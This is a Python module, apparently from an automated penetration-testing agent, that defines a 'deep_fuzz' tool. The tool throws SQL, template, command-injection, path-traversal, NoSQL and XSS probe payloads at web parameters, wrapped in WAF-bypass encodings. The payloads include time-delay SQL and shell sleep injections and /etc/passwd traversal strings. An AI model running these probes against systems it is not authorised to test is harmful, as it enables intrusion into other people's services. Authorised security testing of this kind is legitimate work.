"""Deep mutation-fuzzing engine with WAF-bypass encodings.

The basic injection_fuzz walks a fixed ~10-payload set past most real bugs. This
throws a broad library — multi-DB SQLi (error + time), multi-engine SSTI, command
injection, path traversal, NoSQL — at each parameter, each wrapped in WAF-bypass
encodings (URL / double-URL / SQL-comment), and detects via error signatures,
unique-math reflection, file-content signatures, and time delay. Also tries
HTTP parameter pollution and verb tampering. Bounded by a request budget.
"""

from __future__ import annotations

import asyncio
import json
import re
from typing import Any
from urllib.parse import parse_qs, quote, urlencode, urlparse, urlunparse

from agents import RunContextWrapper, function_tool

from strix.config.settings import depth_cap
from strix.tools.http_replay.tools import _replay_impl


_SLEEP = 5
_DELAY_MS = 4000
_SSTI_MATH = "1447*1451"
_SSTI_PRODUCT = "2099597"
_XSS_MARKER = "strixq7<svg/onload=1>"

# Fast oracles: (family, payload, kind). kind in error|ssti|traversal|nosql|xss.
_FAST: tuple[tuple[str, str, str], ...] = (
    ("sqli", "'", "error"),
    ("sqli", '"', "error"),
    ("sqli", "')", "error"),
    ("sqli", "1'\"", "error"),
    ("ssti", f"{{{{{_SSTI_MATH}}}}}", "ssti"),
    ("ssti", f"${{{_SSTI_MATH}}}", "ssti"),
    ("ssti", f"#{{{_SSTI_MATH}}}", "ssti"),
    ("ssti", f"<%= {_SSTI_MATH} %>", "ssti"),
    ("ssti", f"@({_SSTI_MATH})", "ssti"),
    ("traversal", "../../../../etc/passwd", "traversal"),
    ("traversal", "....//....//....//etc/passwd", "traversal"),
    ("traversal", "%2e%2e%2f%2e%2e%2fetc/passwd", "traversal"),
    ("nosql", '{"$gt":""}', "nosql"),
    ("nosql", "'; return true; var x='", "nosql"),
    ("xss", _XSS_MARKER, "xss"),
)
# Time-based (one per engine); kept small — each costs ~5s.
_TIME: tuple[tuple[str, str], ...] = (
    ("sqli_mysql", f"1' AND SLEEP({_SLEEP})-- -"),
    ("sqli_pg", f"1' OR pg_sleep({_SLEEP})-- -"),
    ("sqli_mssql", f"1'; WAITFOR DELAY '0:0:{_SLEEP}'-- -"),
    ("cmd", f"; sleep {_SLEEP}"),
    ("cmd", f"$(sleep {_SLEEP})"),
)

_ERROR_SIGNATURES = re.compile(
    r"SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLite3::|SQLSTATE|"
    r"Microsoft OLE DB|ODBC SQL|Unclosed quotation|MongoError|BSONError|"
    r"Warning: pg_|valid MySQL result|SQLServer JDBC",
    re.IGNORECASE,
)
_TRAVERSAL_SIGNATURE = re.compile(
    r"root:.*:0:0:|\[(?:extensions|fonts)\]|;\s*for 16-bit app support"
)


def _enc_identity(s: str) -> str:
    return s


def _enc_url(s: str) -> str:
    return quote(s, safe="")


def _enc_double(s: str) -> str:
    return quote(quote(s, safe=""), safe="")


def _enc_comment(s: str) -> str:
    return s.replace(" ", "/**/")


_ENCODERS = (
    ("raw", _enc_identity),
    ("url", _enc_url),
    ("2url", _enc_double),
    ("cmt", _enc_comment),
)


def _set_query(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    query = {k: v[0] for k, v in parse_qs(parsed.query).items()}
    query[name] = value
    return urlunparse(parsed._replace(query=urlencode(query, safe="")))


def _send(
    method: str,
    url: str,
    name: str,
    value: str,
    headers: dict[str, str] | None,
    body: str | None,
    point: str,
    timeout: int,
) -> dict[str, Any]:
    if point == "body" and body is not None:
        try:
            payload = json.loads(body)
        except (json.JSONDecodeError, ValueError):
            payload = {}
        if isinstance(payload, dict):
            payload[name] = value
        return _replay_impl(
            method, url, headers, json.dumps(payload), timeout, allow_redirects=False
        )
    return _replay_impl(
        method, _set_query(url, name, value), headers, body, timeout, allow_redirects=False
    )


def _detect_fast(kind: str, body: str, base_body: str) -> bool:
    if kind == "error":
        return bool(_ERROR_SIGNATURES.search(body)) and not _ERROR_SIGNATURES.search(base_body)
    if kind == "ssti":
        return _SSTI_PRODUCT in body and _SSTI_PRODUCT not in base_body
    if kind == "traversal":
        return bool(_TRAVERSAL_SIGNATURE.search(body))
    if kind == "nosql":
        return bool(_ERROR_SIGNATURES.search(body)) and not _ERROR_SIGNATURES.search(base_body)
    if kind == "xss":
        return _XSS_MARKER in body
    return False


class _Budget:
    def __init__(self, cap: int) -> None:
        self.left = cap

    def take(self) -> bool:
        if self.left <= 0:
            return False
        self.left -= 1
        return True


def _fuzz_param(
    method: str,
    url: str,
    name: str,
    headers: dict[str, str] | None,
    body: str | None,
    point: str,
    budget: _Budget,
    timeout: int,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    base = _send(method, url, name, "strixbase1", headers, body, point, timeout)
    base_body = base.get("body") or ""
    base_ms = base.get("elapsed_ms") or 0

    for family, payload, kind in _FAST:
        for enc_name, enc in _ENCODERS:
            if enc_name == "cmt" and family not in {"sqli"}:
                continue
            if not budget.take():
                return findings
            resp = _send(method, url, name, enc(payload), headers, body, point, timeout)
            if resp.get("success") and _detect_fast(kind, resp.get("body") or "", base_body):
                findings.append(
                    {
                        "param": name,
                        "family": family,
                        "encoding": enc_name,
                        "payload": payload,
                        "severity": "high" if kind == "xss" else "critical",
                        "evidence": f"{kind} signal ({enc_name} encoding)",
                    }
                )
                break

    for family, payload in _TIME:
        if not budget.take():
            return findings
        resp = _send(method, url, name, payload, headers, body, point, max(timeout, _SLEEP + 5))
        delay = (resp.get("elapsed_ms") or 0) - base_ms
        if resp.get("success") and delay >= _DELAY_MS:
            findings.append(
                {
                    "param": name,
                    "family": family,
                    "encoding": "raw",
                    "payload": payload,
                    "severity": "critical",
                    "evidence": f"time-based: {round(delay)}ms delay",
                }
            )
    return findings


def _verb_tampering(url: str, headers: dict[str, str] | None, timeout: int) -> dict[str, Any]:
    statuses: dict[str, Any] = {}
    for verb in ("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"):
        resp = _replay_impl(verb, url, headers, None, timeout, allow_redirects=False)
        statuses[verb] = resp.get("status_code") if resp.get("success") else None
    ok = [v for v, s in statuses.items() if isinstance(s, int) and 200 <= s < 300]
    # Interesting when non-GET verbs succeed (state change reachable) beyond GET.
    interesting = len(ok) > 1 and any(v != "GET" for v in ok)
    return {"statuses": statuses, "extra_methods_allowed": interesting, "allowed": ok}


def _deep_fuzz_impl(
    method: str,
    url: str,
    params: list[str],
    headers: dict[str, str] | None,
    body: str | None,
    injection_point: str,
    max_requests: int,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    if not params:
        return {"success": False, "error": "params cannot be empty (names to fuzz)"}
    point = "body" if injection_point == "body" else "query"
    # STRIX_MAX_DEPTH: fuzz more params and grant a bigger request budget.
    plimit = depth_cap(20, 80)
    budget = _Budget(max(depth_cap(20, 1500), max_requests))
    findings: list[dict[str, Any]] = []
    for name in params[:plimit]:
        findings.extend(_fuzz_param(method, url, name, headers, body, point, budget, timeout))
    return {
        "success": True,
        "url": url,
        "params_fuzzed": len(params[:plimit]),
        "requests_left": budget.left,
        "truncated": budget.left <= 0,
        "finding_count": len(findings),
        "possible_injection": bool(findings),
        "findings": findings,
        "verb_tampering": _verb_tampering(url, headers, timeout),
    }


@function_tool(timeout=900, strict_mode=False)
async def deep_fuzz(
    ctx: RunContextWrapper,
    url: str,
    params: list[str],
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    injection_point: str = "query",
    max_requests: int = 300,
    timeout: int = 12,
) -> str:
    """Deep-fuzz parameters with a broad payload library + WAF-bypass encodings.

    Per parameter: multi-DB SQLi (error + time), multi-engine SSTI, command
    injection, path traversal, and NoSQL — each wrapped in raw / URL / double-URL
    / SQL-comment encodings — detected via DB error signatures, unique-math
    template evaluation, /etc/passwd content, reflected XSS, and time delay. Also
    reports verb tampering (non-GET methods that succeed). Bounded by
    ``max_requests``. Point it at the risky params from ``endpoint_risk_rank``.
    Only test authorized targets.

    Returns JSON with ``findings`` (param/family/encoding/severity/evidence),
    ``verb_tampering``, and ``truncated``.

    Args:
        url: Target URL (params in the query string, or the body).
        params: Parameter names to fuzz (max 20).
        method: HTTP method (default GET).
        headers: Request headers (e.g. auth).
        body: Raw JSON body when ``injection_point='body'``.
        injection_point: ``query`` (default) or ``body``.
        max_requests: Request budget across all params (default 300).
        timeout: Base per-request timeout in seconds (default 12).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _deep_fuzz_impl,
            method,
            url,
            params,
            headers,
            body,
            injection_point,
            max_requests,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )
